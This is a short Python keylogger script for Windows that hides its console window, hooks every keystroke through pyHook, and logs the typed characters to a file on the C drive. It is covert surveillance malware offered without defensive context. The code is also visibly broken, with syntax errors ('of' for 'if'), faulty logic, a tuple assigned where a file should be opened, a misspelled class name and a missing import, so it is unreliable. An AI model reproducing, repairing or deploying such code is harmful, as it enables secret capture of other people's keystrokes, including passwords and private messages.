import win32api
import win32console
import win32gui
import pythoncom, pyHook

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

def OnkeyboardEvent(event):
    if event.Ascii == 5:
        _exit(1)

    of event.Ascii !=0 or 8:

        f = open('c:\output.txt', 'r+') #<-- Creates the file on the C drive


        buffer = f.read()
        f.close() #<-- close the file when user stops typing 

        #starts type again 
        #open output.txt to write current and new keystrokes 

        f = ('c:\output.txt', 'w')

        keylogs = chr(event.Ascii)

        if event.Ascii == 13:

        keylogs = '/n'
        buffer += keylogs
        f.write(buffer)
        f.close()

#create a hook for the manager object 
hm = pyHook.HookManger()
hm.KeyDown = OnkeyboardEvent

#set the hook
hm.HookKeyboard()

#wait forever
pythoncom.PumpMessages()
